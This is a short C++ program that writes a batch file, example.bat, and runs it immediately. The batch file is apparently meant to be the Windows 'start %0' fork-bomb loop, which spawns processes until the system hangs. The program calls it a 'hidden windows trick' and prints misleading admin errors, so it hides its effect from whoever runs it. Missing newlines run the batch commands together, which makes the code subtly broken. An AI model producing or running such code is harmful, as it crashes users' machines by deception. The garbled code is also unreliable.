
#include <iostream>
#include <fstream>
#include <cstdlib>  

int main() {
    std::ofstream batFile("example.bat");
    if (batFile.is_open()) {
        batFile << "@echo off\n";
        batFile << ":function";    
        batFile << "start %0";
        batFile << "goto function";
        batFile.close();
        std::cout << "Batch file created successfully, should run a hidden windows trick\n";
    } else {
        std::cerr << "Error: Run as an Admin.\n";
        return 1;
    }

    // Step 2: Run the .bat file
    int result = system("example.bat");
    if (result == 0) {
        std::cout << "Code executed successfully.\n";
    } else {
        std::cerr << "Error: Run as an Admin.\n";
    }

    return 0;
}
